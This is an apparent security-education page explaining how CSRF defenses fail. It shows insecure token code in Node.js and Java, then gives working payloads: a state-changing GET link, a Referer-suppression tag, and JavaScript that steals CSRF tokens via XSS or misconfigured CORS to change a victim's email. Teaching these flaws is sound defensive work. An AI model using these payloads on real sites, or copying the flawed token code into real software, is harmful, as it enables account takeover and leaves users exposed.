# Bypassing common CSRF defense flaws

* Under specific circumstances, CSRF prevention techniques can occasionally be circumvented when specific conditions apply, emphasizing the importance of recognizing these weaknesses when implementing security measures.

![Bypassing][1]

## Bypassing anti-CSRF tokens

### When CSRF token is not tied to the user session

* Happens when web applications do not check whether the token belongs to the same session as the user making the request, instead depending on a global pool of issued tokens and validating requests based on token presence in that pool.
* In this case, an attacker may authenticate using their own account, obtain a valid CSRF token, and leverage it to generate requests impersonating the victim.
* The code below demonstrates this insecure implementation:

@@TagStart@@node.js

  ```javascript
  const csrfTokens = new Set();

  const generateCsrfTokens = () => {
    const token = randomBytes(16).toString("hex");
    csrfTokens.add(token);
    return token;
  };

  const csrfProtection = (req, res, next) => {
    const token = req.headers["x-csrf-token"];
    
    if (!token || !csrfTokens.has(token)) {
      res.status(403).json({ message: "Invalid CSRF token" });
      return;
    }

    next();
  };
  ```

@@TagEnd@@
@@TagStart@@java

  <details>
  <summary>Dependencies</summary>

  ```java
  import java.security.SecureRandom;
  import java.util.Base64;
  import java.util.HashSet;
  import java.util.Set;
  ```

  </details>

  ```java
  public class CsrfProtection {

      private static final Set<String> csrfTokens = new HashSet<>();
      private static final SecureRandom secureRandom = new SecureRandom();

      // Generate a CSRF token and store it in the set
      public static String generateCsrfToken() {
          byte[] randomBytes = new byte[16];
          secureRandom.nextBytes(randomBytes);
          String token = Base64.getUrlEncoder().withoutPadding().encodeToString(randomBytes);
          csrfTokens.add(token);
          return token;
      }

      // Validate the CSRF token
      public static boolean isValidCsrfToken(String token) {
          return token != null && csrfTokens.contains(token);
      }
  }
  ```

@@TagEnd@@

### When CSRF token is predictable

* If the CSRF token generation lacks sufficient randomness, the token can become predictable.
* Attackers can leverage brute force techniques to predict a valid token if the application relies on sequential numbering or a constrained set of predefined values.
* Predictable tokens compromise the effectiveness of the whole anti-CSRF system, granting attackers the ability to evade protections and perform unauthorized activities.
* The following snippet represents this flawed security practice:

@@TagStart@@node.js

  ```javascript
  const generateToken = (req) => {
    // Generates a predictable token with low entropy (6-digit number)
    const token = randomInt(100000, 999999).toString();
    req.session.csrfToken = token;
    return token;
  };
  ```

@@TagEnd@@
@@TagStart@@java

  ```java
  import java.util.Random;

  public class CsrfTokenGenerator {

      private static final Random random = new Random();

      // Generates a predictable CSRF token with low entropy (6-digit number)
      public static String generateToken(Session session) {
          String token = String.valueOf(random.nextInt(900000) + 100000);
          session.setCsrfToken(token);
          return token;
      }
  }
  ```

@@TagEnd@@

## Bypassing `SameSite` cookie attribute

* The `SameSite` cookie attribute set to `Lax` can be circumvented if the web application allows state-changing actions via `GET` requests.
* Under the `Lax` setting, the browser sends cookies for cross-site navigation triggered by the user when a safe request method such as `GET` is employed, enabling cookies to be attached to the request when a link is followed from another site.
* A user could just be tricked into clicking a link that performs the CSRF attack:

  ```html
  <a href="https://vulnerable.tbl/email/update?email=attacker@attacker.tbl">Click here for a surprise!</a>
  ```

## Bypassing `Referer`-based CSRF protections

* Certain web applications incorrectly rely on the HTTP `Referer` header as a CSRF defense, using it to validate whether a request originates from the application's domain.
* Although a basic form of defense is achieved through this approach, it is typically ineffective and exposed to multiple bypass mechanisms.

### When `Referer` validation depends on its presence

* Some web applications verify the `Referer` header only when it is included in the request, skipping validation if it is missing and assuming the request is legitimate. This allows an attacker to craft a CSRF exploit that forces the victim's browser to exclude the `Referer` header in the request.
* The following HTML code can be placed on a malicious website owned by an attacker to ensure that requests originating from their page do not include the `Referer` header:
  
  ```html
  <meta name="referrer" content="no-referrer">
  ```

### When `Referer` validation is non-strict

* If the web application does not strictly validate the `Referer` header value, attackers can bypass the protection by crafting requests from malicious domains that partially match the expected value.
* As example, if the application only checks that whether the `Referer` domain contains `vulnerable.tbl`, an attacker can manipulate it by using a matching subdomain:

  ```url
  https://vulnerable.tbl.attacker.tbl/
  ```

## Bypassing CSRF protections via XSS

* CSRF protections can be entirely bypassed by `Cross-Site Scripting (XSS)` vulnerabilities, as XSS enables attackers to run arbitrary JavaScript in the victim's browser.
* Similar to the following CORS misconfiguration scenario, XSS enables an attacker to make requests as the victim and access the server's responses. By inspecting server responses, an attacker can obtain CSRF tokens and craft seemingly legitimate requests.
* These unauthorized requests can retrieve server responses that include sensitive information, such as CSRF tokens embedded in HTML forms or API responses. This allows the attacker to use the stolen token for subsequent state-changing requests:

  ```html
  <script>
    fetch('/change/email', { credentials: 'include' })
      .then(response => response.text())
      .then(html => {
        // Parse the HTML to extract the CSRF token
        const parser = new DOMParser();
        const doc = parser.parseFromString(html, 'text/html');
        const csrfToken = doc.querySelector('input[name="csrf-token"]').value;

        // Use the extracted CSRF token to craft a malicious request
        fetch('/change/email', {
          method: 'POST',
          credentials: 'include', // Send victim's session cookie
          headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
          },
          body: `email=attacker@attacker.tbl&csrf-token=${csrfToken}`,
        });
      });
  </script>
  ```

  * Using the victim's authentication (i.e., via cookies), the first fetch request retrieves the CSRF token from a protected endpoint, with `DOMParser` parsing the HTML to find the hidden `csrf-token` input field and store its value in `csrfToken`.
  * The attacker leverages then the stolen CSRF token to send a POST request to `/change/email`, altering the victim's email to `attacker@attacker.tbl` while using again the victim's authenticated session cookies.

## Bypassing CSRF protections via misconfigured CORS

* Misconfigured `Cross-Origin Resource Sharing (CORS)` policies can also allow an attacker to perform cross-origin requests that should otherwise be blocked.
* A web application that enables cross-origin requests and dynamically reflects the origin (`Access-Control-Allow-Origin: https://attacker.com`) while accepting credentials (`Access-Control-Allow-Credentials: true`) is susceptible to CSRF exploitation bypassing any anti-token security mechanism.
* As this behavior enables JavaScript to read HTTP responses, CSRF tokens can be retrieved via a GET request and then used to execute the undesired action (e.g., change the user's email address):

  ```html
  <script>
    async function exploitCSRF() {
      const csrfToken = await fetch("https://vulnerable.tbl/csrf-token", {
        method: "GET",
        credentials: "include" // Sends victim's session cookie
      })
      .then(response => response.json())
      .then(data => data.csrfToken);

      fetch("https://vulnerable.tbl/email/update", {
        method: "POST",
        credentials: "include", // Send victim's session cookie
        headers: {
          "Content-Type": "application/x-www-form-urlencoded",
          "X-CSRF-Token": csrfToken
        },
        body: "email=attacker@attacker.tbl"
      });
    }

    exploitCSRF();
  </script>
  ```

  * In this case, as can be seen, the CSRF token is retrieved from a web application endpoint rather than being embedded as a hidden input field in an HTML form.
  * It also includes the CSRF token in the `X-CSRF-Token` header, requiring the CORS policy to explicitly allow `X-CSRF-Token` via `Access-Control-Allow-Headers: X-CSRF-Token`, otherwise the browser will block the request before reaching the server.
  * Similarly, if `POST` method is not permitted in `Access-Control-Allow-Methods: POST`, the web application's CORS policy will cause the browser to block preflighted cross-origin POST requests.

    > :older_man: There is a slight difference between including the token in the request body and placing it in a custom HTTP header, as requests with custom headers are inherently restricted by the `Same-Origin Policy (SOP)`, which represents an additional protection layer.

[1]: /static/images/bypassing.png
